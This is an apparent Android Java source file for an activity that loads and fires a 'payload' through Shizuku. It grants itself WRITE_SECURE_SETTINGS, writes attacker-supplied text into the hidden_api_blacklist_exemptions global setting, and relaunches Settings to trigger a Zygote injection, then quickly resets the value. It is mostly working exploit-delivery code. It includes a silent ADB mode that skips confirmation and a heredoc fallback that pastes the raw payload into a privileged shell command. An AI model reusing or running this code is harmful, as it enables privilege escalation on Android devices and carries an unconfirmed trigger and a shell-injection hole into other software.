package com.wqry085.deployesystem.next;

import android.app.Activity;
import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.content.FileProvider;

import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.wqry085.deployesystem.MaterialDialogHelper;
import com.wqry085.deployesystem.R;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import rikka.shizuku.Shizuku;

/**
 * Payload 加载器 Activity
 * 
 * 支持两种调用方式：
 * 1. 通过分享（Share Intent）接收文件或文本
 * 2. 通过 ADB 直接调用（静默模式）
 * 
 * ADB 调用示例：
 * am start -n com.wqry085.deployesystem/.next.RunPayload \
 *     -a com.wqry085.deployesystem.ADB_RUN_PAYLOAD \
 *     --es payload "your_payload_content"
 */
public class RunPayload extends Activity {

    private static final String TAG = "RunPayload";

    // Intent Actions & Extras
    private static final String ACTION_ADB_RUN = "com.wqry085.deployesystem.ADB_RUN_PAYLOAD";
    private static final String EXTRA_ADB_DIRECT = "adb_direct_run";
    private static final String EXTRA_FROM_ADB = "from_adb";
    private static final String EXTRA_PAYLOAD = "payload";

    // Settings
    private static final String SETTINGS_KEY = "hidden_api_blacklist_exemptions";
    private static final String SETTINGS_URI = "content://settings/global";
    private static final String CONFIG_FILE_PATH = "/data/local/tmp/只读配置.txt";
    private static final int RESET_DELAY_MS = 200;

    // State
    private Uri fileUri;
    private boolean isSilentMode = false;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    // ==================== Lifecycle ====================

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();
        if (intent == null) {
            finishQuietly();
            return;
        }

        // 检查是否为静默模式（ADB 调用）
        isSilentMode = isAdbDirectCall(intent);

        if (isSilentMode) {
            handleAdbIntent(intent);
        } else {
            handleShareIntent(intent);
        }
    }

    @Override
    protected void onDestroy() {
        executor.shutdownNow();
        super.onDestroy();
    }

    // ==================== Intent Handlers ====================

    /**
     * 检查是否为 ADB 直接调用
     */
    private boolean isAdbDirectCall(@NonNull Intent intent) {
        // 方式1：特定 Action
        if (ACTION_ADB_RUN.equals(intent.getAction())) {
            return true;
        }

        // 方式2：特定 Extra
        if (intent.hasExtra(EXTRA_ADB_DIRECT)) {
            return true;
        }

        // 方式3：无调用包名 + 标记
        if (getCallingPackage() == null && intent.hasExtra(EXTRA_FROM_ADB)) {
            return true;
        }

        return false;
    }

    /**
     * 处理 ADB 静默调用
     */
    private void handleAdbIntent(@NonNull Intent intent) {
        String payload = extractPayload(intent);

        if (payload != null && !payload.isEmpty()) {
            executePayload(payload);
        }

        finishQuietly();
    }

    /**
     * 处理分享 Intent
     */
    private void handleShareIntent(@NonNull Intent intent) {
        // 尝试获取文件 URI
        fileUri = intent.getParcelableExtra(Intent.EXTRA_STREAM);

        // 如果没有文件，尝试获取文本
        if (fileUri == null) {
            String sharedText = intent.getStringExtra(Intent.EXTRA_TEXT);

            if (sharedText == null || sharedText.isEmpty()) {
                showToast(R.string.runpayload_no_file_or_text);
                finishQuietly();
                return;
            }

            fileUri = createTempFileUri(sharedText);
            if (fileUri == null) {
                showToast(R.string.runpayload_cant_create_temp_file);
                finishQuietly();
                return;
            }
        }

        showConfirmDialog();
    }

    /**
     * 从 Intent 提取 payload 内容
     */
    @Nullable
    private String extractPayload(@NonNull Intent intent) {
        // 优先级：payload extra > EXTRA_TEXT > data URI
        if (intent.hasExtra(EXTRA_PAYLOAD)) {
            return intent.getStringExtra(EXTRA_PAYLOAD);
        }

        if (intent.hasExtra(Intent.EXTRA_TEXT)) {
            return intent.getStringExtra(Intent.EXTRA_TEXT);
        }

        Uri data = intent.getData();
        if (data != null && "content".equals(data.getScheme())) {
            return readContentFromUri(data);
        }

        return null;
    }

    // ==================== File Operations ====================

    /**
     * 创建临时文件并返回 URI
     */
    @Nullable
    private Uri createTempFileUri(@NonNull String content) {
        try {
            File tempFile = new File(getCacheDir(), "payload_" + System.currentTimeMillis() + ".txt");
            try (FileOutputStream fos = new FileOutputStream(tempFile)) {
                fos.write(content.getBytes(StandardCharsets.UTF_8));
            }
            return FileProvider.getUriForFile(this, getPackageName() + ".fileprovider", tempFile);
        } catch (IOException e) {
            Log.e(TAG, "Failed to create temp file", e);
            return null;
        }
    }

    /**
     * 从 URI 读取内容（保留原始格式）
     */
    @Nullable
    private String readContentFromUri(@NonNull Uri uri) {
        try (InputStream is = getContentResolver().openInputStream(uri)) {
            if (is == null) return null;
            return readStreamFully(is);
        } catch (IOException e) {
            Log.e(TAG, "Failed to read from URI: " + uri, e);
            return null;
        }
    }

    /**
     * 完整读取输入流（保留所有字符）
     */
    @NonNull
    private String readStreamFully(@NonNull InputStream is) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int read;
        while ((read = is.read(buffer)) != -1) {
            baos.write(buffer, 0, read);
        }
        return baos.toString(StandardCharsets.UTF_8.name());
    }

    // ==================== UI ====================

    /**
     * 显示确认对话框
     */
    private void showConfirmDialog() {
        new MaterialAlertDialogBuilder(this)
                .setTitle(R.string.runpayload_confirm_load_third_party)
                .setMessage(getString(R.string.runpayload_payload_path_source) + "\n" + fileUri)
                .setCancelable(false)
                .setPositiveButton(R.string.runpayload_run_payload, (dialog, which) -> loadAndExecute())
                .setNegativeButton(R.string.runpayload_cancel, (dialog, which) -> finishQuietly())
                .setOnDismissListener(dialog -> {
                    // 如果用户按返回键关闭对话框
                })
                .show();
    }

    /**
     * 加载文件并执行
     */
    private void loadAndExecute() {
        executor.execute(() -> {
            String content = readContentFromUri(fileUri);

            if (content == null) {
                showToastOnUiThread(R.string.runpayload_cant_open_file);
                finishOnUiThread();
                return;
            }

            mainHandler.post(() -> {
                try {
                    executePayload(content);
                } catch (Exception e) {
                    Log.e(TAG, "Execute failed", e);
                    if (!isSilentMode) {
                        showToast(getString(R.string.runpayload_process_failed) + e.getMessage());
                    }
                } finally {
                    finishQuietly();
                }
            });
        });
    }

    // ==================== Payload Execution ====================

    /**
     * 执行 Payload
     */
    private void executePayload(@NonNull String payload) {
        Log.i(TAG, "Executing payload, length: " + payload.length());

        // 1. 授予权限
        shizukuExec("pm grant " + getPackageName() + " android.permission.WRITE_SECURE_SETTINGS");

        // 2. 停止 Settings 应用
        shizukuExec("am force-stop com.android.settings");

        // 3. 写入配置文件（使用 base64 保留原始格式）
        writePayloadToFile(payload);

        // 4. 写入系统设置
        boolean success = writeToSettings(payload);

        // 5. 启动 Settings
        shizukuExec("am start -n com.android.settings/.Settings");

        // 6. 延迟重置
        scheduleSettingsReset();

        // 7. 显示结果
        if (!isSilentMode) {
            if (success) {
                showToast(R.string.runpayload_payload_loaded_successfully);
            }
        }
    }

    /**
     * 写入 Payload 到文件（使用 base64 编码保证完整性）
     */
    private void writePayloadToFile(@NonNull String payload) {
        try {
            String base64 = Base64.encodeToString(
                    payload.getBytes(StandardCharsets.UTF_8),
                    Base64.NO_WRAP
            );
            shizukuExec("echo '" + base64 + "' | base64 -d > " + CONFIG_FILE_PATH);
        } catch (Exception e) {
            Log.w(TAG, "Base64 write failed, trying fallback", e);
            writePayloadFallback(payload);
        }
    }

    /**
     * 备用写入方法（使用 cat 和 heredoc）
     */
    private void writePayloadFallback(@NonNull String payload) {
        try {
            // 使用 heredoc 避免转义问题
            String delimiter = "EOF_" + System.currentTimeMillis();
            String command = String.format(
                    "cat > %s << '%s'\n%s\n%s",
                    CONFIG_FILE_PATH, delimiter, payload, delimiter
            );
            shizukuExec(command);
        } catch (Exception e) {
            Log.e(TAG, "Fallback write failed", e);
        }
    }

    /**
     * 写入系统设置
     */
    private boolean writeToSettings(@NonNull String payload) {
        ContentValues values = new ContentValues();
        values.put(Settings.Global.NAME, SETTINGS_KEY);
        values.put(Settings.Global.VALUE, payload);

        try {
            getContentResolver().insert(Uri.parse(SETTINGS_URI), values);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Failed to write settings", e);
            if (!isSilentMode) {
                MaterialDialogHelper.showSimpleDialog(
                        this,
                        getString(R.string.runpayload_payload_load_failed),
                        e.getMessage()
                );
            }
            return false;
        }
    }

    /**
     * 延迟重置设置
     */
    private void scheduleSettingsReset() {
        mainHandler.postDelayed(() -> {
            ContentValues values = new ContentValues();
            values.put(Settings.Global.NAME, SETTINGS_KEY);
            values.put(Settings.Global.VALUE, "null");
            try {
                getContentResolver().insert(Uri.parse(SETTINGS_URI), values);
            } catch (Exception e) {
                Log.w(TAG, "Failed to reset settings", e);
            }
        }, RESET_DELAY_MS);
    }

    // ==================== Shizuku ====================

    /**
     * 通过 Shizuku 执行 Shell 命令
     */
    @NonNull
    private static String shizukuExec(@NonNull String command) {
        StringBuilder output = new StringBuilder();

        try {
            Process process = Shizuku.newProcess(new String[]{"sh"}, null, null);

            // 写入命令
            try (OutputStream os = process.getOutputStream()) {
                os.write((command + "\nexit\n").getBytes(StandardCharsets.UTF_8));
                os.flush();
            }

            // 读取标准输出
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            // 读取错误输出
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }

            int exitCode = process.waitFor();
            if (exitCode != 0) {
                Log.w(TAG, "Command exited with code " + exitCode + ": " + command);
            }

        } catch (Exception e) {
            Log.e(TAG, "Shizuku exec failed: " + command, e);
            return e.toString();
        }

        return output.toString();
    }

    // ==================== Utilities ====================

    private void showToast(int resId) {
        if (!isSilentMode) {
            Toast.makeText(this, resId, Toast.LENGTH_SHORT).show();
        }
    }

    private void showToast(@NonNull String message) {
        if (!isSilentMode) {
            Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
        }
    }

    private void showToastOnUiThread(int resId) {
        if (!isSilentMode) {
            mainHandler.post(() -> Toast.makeText(this, resId, Toast.LENGTH_SHORT).show());
        }
    }

    private void finishOnUiThread() {
        mainHandler.post(this::finishQuietly);
    }

    private void finishQuietly() {
        try {
            finish();
        } catch (Exception e) {
            // ignore
        }
    }
}